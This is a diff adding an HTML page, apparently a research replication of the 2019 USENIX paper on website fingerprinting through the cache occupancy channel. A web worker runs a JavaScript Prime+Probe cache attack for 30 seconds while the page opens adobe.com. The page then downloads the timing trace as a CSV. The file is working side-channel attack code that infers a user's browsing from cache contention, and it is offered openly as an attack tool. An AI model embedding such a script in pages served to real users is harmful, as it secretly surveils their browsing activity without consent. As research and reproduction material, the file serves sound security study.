@@ -1,0 +1,311 @@
+<html>
+
+<!--   @inproceedings{DBLP:conf/uss/ShustermanKHMMO19,
+  author    = {Anatoly Shusterman and
+               Lachlan Kang and
+               Yarden Haskal and
+               Yosef Meltser and
+               Prateek Mittal and
+               Yossi Oren and
+               Yuval Yarom},
+  title     = {Robust Website Fingerprinting Through the Cache Occupancy Channel},
+  booktitle = {{USENIX} Security Symposium},
+  pages     = {639--656},
+  publisher = {{USENIX} Association},
+  year      = {2019}
+} -->
+
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+    <script id="workerSource" ,type = "javascript/worker" >
+            // worker constants
+             // otherwise VSCode complains...
+
+        //Total measure time
+        const MEASUREMENT_TIME_IN_MS = 30000;
+
+        //Setting Time resolution
+        const SAMPLING_PERIOD_IN_MS = 5;
+        const SET_SKIPPING_STEP = 2;
+		
+        //This should be changed based on Attacker's machine
+		const CACHE_SETS = 16384; const CACHE_WAYS = 12;
+		
+        //const CACHE_SETS = 8192; const CACHE_WAYS = 12;
+        //(Seonghun) Changed Set to 8192, and ways to 12;
+       
+
+        const BYTES_PER_MB = 1024 * 1024;
+        const SETS_PER_PAGE = 64;
+
+        const COUNT_SWEEPS = false; // if false, measure time. if true, measure how many cache sweeps we get until the clock changes
+
+        const startTime = Date.now(); //gets start time for naming files
+
+        var exit = new Boolean(false);
+
+        // Prime and probe object
+        function PrimeProbe(sets, ways) {
+            this.evictionArray = new Uint32Array(32 * BYTES_PER_MB / Uint32Array.BYTES_PER_ELEMENT); //Why do we need array that big
+            this.setHeads = new Array(SETS_PER_PAGE);
+
+            this.probeSet = function (setOffset){
+                var elementsWentOver = 0;
+                // Go over all elements in the set
+                var pointer = this.setHeads[setOffset];
+                var listHead = pointer;
+                do {
+                     elementsWentOver++;
+                    pointer = this.evictionArray[pointer];
+                } while (pointer != listHead);
+
+                 // console.log("Went over " + elementsWentOver + " elements.");
+                return pointer;
+            }
+
+            this.probeSetLimited = function (setOffset, hops) {
+                //var elementsWentOver = 0;
+                // Go over all elements in the set
+                var pointer = this.setHeads[setOffset];
+                var listHead = pointer;
+                do {
+                    // elementsWentOver++;
+                    pointer = this.evictionArray[pointer];
+                    hops--;
+                } while ((hops != 0) && (pointer != listHead));
+
+                // console.log("Went over " + elementsWentOver + " elements.");
+                return pointer;
+            }
+
+            this.probeSets = function (sets) {
+                // Probe some of the sets in the page
+                for (setOffset in sets) {
+                    this.probeSet(sets[setOffset]);
+                }
+            }
+
+            this.probeAllSets = function () {
+                for (var set = 0; set < SETS_PER_PAGE; set += SET_SKIPPING_STEP) {
+                    if (!exit) { break; }
+                    this.probeSet(set);
+                }
+            }
+
+            this.shuffle = function (arrayToShuffle) {
+                var tmp, current, top = arrayToShuffle.length;
+                if (top) while (--top) {
+                    current = Math.floor(Math.random() * (top + 1));
+                    tmp = arrayToShuffle[current];
+                    arrayToShuffle[current] = arrayToShuffle[top];
+                    arrayToShuffle[top] = tmp;
+                }
+                return arrayToShuffle;
+            }
+
+            this.createSetHeads = function (sets, ways) {
+                // We have 64 set heads, each should to a list of size 128*[ways]=1536
+                var unshuffledArray = new Uint32Array(sets / SETS_PER_PAGE);
+                var allSetOffset = Math.log2(sets) + 4; // 17 for sets=8192, 16 for sets=4096
+
+                var i;
+                for (i = 0; i < unshuffledArray.length; i++) {
+                    unshuffledArray[i] = i;
+                }
+
+                // Shuffle the array
+                var shuffledArray = this.shuffle(unshuffledArray);
+
+                // Now write into the eviction buffer
+                // virtual address is:
+                // LLL LEEE EEEE SSSS SS00 00[00] (last 2 bits are because of UINT32 vs BYTE)
+                //               ^^^^ ^^ - these 6 bits determine the set index, 64 possible values
+                //               ^^^^ ^^^^ ^^ ^^ - these 12 bits (4K) are the same in physical and in virtual
+                //      ^^^ ^^^^ we keep the set and change these 6/7 bits to 64/128 different values to cover all 8192=128*64 sets
+                // ^^^ ^  - we use 12/16 different values for this to touch each set 12/16 times, once per line
+                var set_index, element_index, line_index;
+                var currentElement, nextElement;
+                for (set_index = 0; set_index < SETS_PER_PAGE; set_index++) {
+                    currentElement = (shuffledArray[0] << 10) + (set_index << 4);
+                    this.setHeads[set_index] = currentElement;
+                    for (line_index = 0; line_index < ways; line_index++) {
+                        //currentElement = (line_index << 17) + (shuffledArray[0] << 10) + (set_index << 4);
+
+                        for (element_index = 0; element_index < sets / SETS_PER_PAGE - 1; element_index++) {
+                            nextElement = (line_index << allSetOffset) + (shuffledArray[element_index + 1] << 10) + (set_index << 4);
+                            this.evictionArray[currentElement] = nextElement;
+                            currentElement = nextElement;
+                        } // element
+                        if (line_index == ways - 1) {
+                            // In the last line, the last pointer goes to the head of the entire set
+                            nextElement = this.setHeads[set_index];
+                        } else {
+                            // Last pointer goes back to the head of the next line
+                            nextElement = ((line_index + 1) << allSetOffset) + (shuffledArray[0] << 10) + (set_index << 4);
+                        }
+                        this.evictionArray[currentElement] = nextElement;
+                        currentElement = nextElement;
+                    } // line
+                } // set
+
+            };
+
+            this.createSetHeads(sets, ways);
+
+            // check that this doesn't crash/get stuck
+            this.probeSets([1, 2, 3, 4, 5]);
+        } // PP object.
+
+        PP = new PrimeProbe(CACHE_SETS, CACHE_WAYS);
+
+        var resultArray = new Array(Math.ceil(MEASUREMENT_TIME_IN_MS / SAMPLING_PERIOD_IN_MS));
+
+
+        function performMeasurement() {
+            // For each measurement period
+            var measurement_index, busySpins = 0;
+            var nextMeasurementStartTime = performance.now(), currentTime;
+
+            nextMeasurementStartTime += SAMPLING_PERIOD_IN_MS;
+
+            // Spin until we're ready for the next measurement
+            do {
+                currentTime = performance.now();
+            }
+            while (currentTime < nextMeasurementStartTime);
+
+            for (measurement_index = 0; measurement_index < resultArray.length; measurement_index++) {
+
+                nextMeasurementStartTime += SAMPLING_PERIOD_IN_MS;
+                currentTime = performance.now();
+
+                // if we've run out of time, skip the measurement
+                if (currentTime >= nextMeasurementStartTime) {
+                    if (COUNT_SWEEPS == true) {
+                        resultArray[measurement_index] = 0;
+                    } else {
+                        resultArray[measurement_index] = SAMPLING_PERIOD_IN_MS; // Some arbitrarily high value...
+                    }
+                } else {
+                    if (COUNT_SWEEPS == true) {
+                        var sweeps = 0;
+                        // repeatedly perform the measurement until the clock changes
+                        do {
+                            currentTime = performance.now();
+                            sweeps++;
+                            PP.probeAllSets();
+                            console.log("Counting Sweeps");
+                        } while (currentTime < nextMeasurementStartTime);
+                    }
+                    else {
+                        // otherwise, perform the measurement
+                        PP.probeAllSets();
+                    }
+                    // log how many spins it took until the clock ticked again
+                    if (COUNT_SWEEPS == true) {
+                        // log how many spins it took until the clock ticked again
+                        resultArray[measurement_index] = sweeps;
+                    } else {
+                        resultArray[measurement_index] = performance.now() - currentTime;
+                    }
+                    // Prepare for the next measurement
+                    do {
+                        currentTime = performance.now();
+                    }
+                    while (currentTime < nextMeasurementStartTime);
+                }
+            }
+        }
+
+        // Sampling:
+        onmessage = function (e) {
+
+            performMeasurement();
+
+            // Send the result array back to the main page.
+            postMessage(resultArray);
+        }
+
+
+    </script>
+
+    <!-- ^^^ worker thread /////////////// vvv main code -->
+
+    <!--script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script> -->
+
+
+    <script>
+        //var newURL = window.location.search; //Changed (Ege)
+        //var site = newURL.split('?'); //Changed (Ege)
+
+        function download(content, fileName, contentType) {
+            var a = document.createElement("a");
+            var file = new Blob([content], {type: contentType});
+            a.href = URL.createObjectURL(file);
+            a.download = fileName;
+            a.click();
+        }
+
+
+        function handleMessageFromWorker(msg) {
+            // var currdate = Date.now() + '';
+            // console.log(currdate + ': Thread returned: ' + msg.data);
+            //  var myJSON = JSON.stringify(
+            //     {
+            //         CurrentDate: currdate,
+            //         //Tag: TAG,
+            //         //SiteName: site[1],
+            //         Cache_Probe: msg.data
+            //     })
+
+            //download(msg.data, 'ssdec21-13_' + startTime + '.csv', 'text/plain');
+			download(msg.data, 'adobe'+ startTime + '.csv', 'test/plain');
+ 
+            openedWindow.close()
+            //window.close()
+
+            //window.open("PrimeProbe_Test_1.html")
+            //window.close()
+            openedWindow.close()
+
+            exit = Boolean(true);
+        }
+
+        function sleep_for(amt){
+            a = 0;
+            for (let i = 0; i<amt; i++)
+            {
+                a = a+1;
+            }
+        }
+
+        
+
+        
+
+        var blob = new Blob([
+            document.querySelector('#workerSource').textContent
+        ], { type: "text/javascript" })
+        var myWorker = new Worker(window.URL.createObjectURL(blob));
+        myWorker.addEventListener('message', handleMessageFromWorker);
+        console.log("Starting...")
+        myWorker.postMessage(window.location.search.split("?"));
+        sleep_for(1048576000);
+
+        //Set the website address
+        openedWindow = window.open("https://www.adobe.com", "_blank")
+        
+        
+        
+        
+    </script>
+</head>
+
+<body>
+
+
+</body>
+
+</html>
